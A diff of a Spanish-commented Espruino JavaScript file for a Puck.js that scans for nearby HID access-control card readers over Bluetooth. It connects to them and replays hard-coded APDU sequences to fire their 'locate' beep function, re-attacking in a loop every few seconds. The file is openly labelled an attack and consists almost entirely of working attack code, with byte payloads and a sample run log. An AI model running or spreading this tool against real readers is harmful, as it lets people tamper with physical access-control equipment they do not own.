@@ -1,4 +1,3 @@
-
 /* 
 V1:
 Este fichero usa el NRF52 del puck.js para disparar la funcion "locate" originalmente encontrada dentro de HID Reader Manager App, 
@@ -33,13 +32,6 @@ ToDo's:
 
 
 
-
-
-
-
-
-
-
 Una ejecucion valida es la siguiente 
 WRONG:c00a440aa000440011010            -> Wrong AID1 
 WRONG:c00a440aa00038202d0110           -> Wrong AID2 
@@ -65,29 +57,14 @@ Reiniciando ataque por E12:e12
 
 */
 
-
-
-
-
-
-
-
-
 let clickcount = 0;
 let clickevent = null;
-
-
-
-
-
-
 var gatt;
 var wrong = new Uint8Array([0xC0, 0x6A, 0x82]); //Wrong AID1 y Wrong AID2
 var aid = new Uint8Array([0xC0, 0x6F, 0x08, 0x85, 0x06, 0x02, 0x01, 0x40, 0x02, 0x01, 0x00, 0x90, 0x00]);//Correct AID
 var ack = new Uint8Array([0xC0, 0x90, 0x00]);// ACK1 y ACK2
 var part1 = new Uint8Array([0x81, 0x44, 0x3E, 0x44, 0x00, 0x00, 0x00, 0xA6, 0x13, 0xA1, 0x11, 0xA1, 0x0F, 0x80, 0x01, 0x50, 0x81, 0x01, 0x01, 0x82]).buffer;//part1A
 var part2 = new Uint8Array([0x40, 0x01, 0x01, 0x83, 0x01, 0x00, 0x84, 0x01, 0x01, 0x90, 0x00]).buffer;//part1b
-// var OldBeep = new Uint8Array([0xC0, 0x44, 0x3E, 0x44, 0x00, 0x00, 0x00, 0xA6, 0x06, 0xA0, 0x04, 0x85, 0x02, 0x1F, 0x40, 0x90, 0x00]);  Sacada del github del pavito, parece que sirve para lectores mas antiguos
 var NewBeep = new Uint8Array([0xC0, 0x44, 0x3E, 0x44, 0x00, 0x00, 0x00, 0xA6, 0x06, 0xA0, 0x04, 0x85, 0x02, 0x7D, 0x00, 0x90, 0x00]);
 var count = 0;
 let serviceUuid = "00009800-0000-1000-8000-00177a000002";
@@ -96,10 +73,17 @@ var succ = false;
 
 
 
+/*
+Filtro con el serviceUuid de los lectores y un timeout de 10 segundos porque io que se me parecia bueno
+no dejarlo infinito que la mierda esta tiene 2 de memoria
+*/
 
 let options = {
-    filters: [{services: [serviceUuid]}],timeout: 3000};
+    filters: [{services: [serviceUuid]}],timeout: 10000};
 
+/*
+Funcion para buscar los lectores cercanos, lanza un device por cada lecotr encontrado
+*/
 
 function search(){
   //NRF.setScan(); //para pararlo (aunque creo haber leido que se para al devolver uno durante un tiempo?¿
@@ -108,6 +92,9 @@ function search(){
   LED3.set();
 }
 
+/*
+Funcion para parsear cada uno de los lectores que encuentre, esto debería funcionar
+*/
 
 function parseReader(device){
   console.log("Lector encontrado!!");
@@ -190,12 +177,9 @@ function parseReader(device){
 
 }
 
-
-
-
-
-
-
+/*
+Funcion mono ataque, ataca a un solo lector, el primero que pille
+*/
 
 function attack() {
     // Nivel de batería por pantalla porque io que se
@@ -256,7 +240,7 @@ function attack() {
                           setTimeout(function () {
                           console.log("Atacando de nuevo!!!");
                           /*
-                          toma recursivo, seguro que esto no causa problemas en un embebido con la memoria                                   equivalente a la de DORI
+                          toma recursivo, seguro que esto no causa problemas en un embebido con la memoria equivalente a la de DORI
                           */
                           attack(); 
                           }, 3000);//espera 3 segx para que le de tiempo a hacer sus mierdas
